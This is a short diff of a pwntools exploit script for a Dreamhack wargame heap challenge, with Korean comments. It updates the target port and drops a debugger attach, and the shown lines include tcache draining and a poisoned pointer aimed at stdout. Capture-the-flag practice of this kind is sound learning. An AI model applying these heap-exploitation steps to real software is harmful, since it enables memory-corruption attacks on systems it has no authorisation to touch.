@@ -6,7 +6,7 @@ context.binary = elf = ELF('./main')
 # context.log_level = "debug"
 context.terminal = ["tmux", "splitw", "-h"]
 
-HOST, PORT = "host3.dreamhack.games 8296".split()
+HOST, PORT = "host3.dreamhack.games 19521".split()
 
 def slog(n, a): return info(": ".join([n, hex(a)]))
 
@@ -129,9 +129,6 @@ for i in range(3, 8): # tcache 비우기
 # tcache: 0
 
 get_cat(10) # tcache-> 비어있음, fastbin은 애초에 크기 커서 그 쪽으로 갈 일 없음, smallbin에서 가져옴 cat0 가져감
-
-gdb.attach(p)
-pause()
 
 pet_cat(0, p64(elf.sym['stdout'] ^ guard)) # stdout, 원래 cat2가 담겨있었음
 
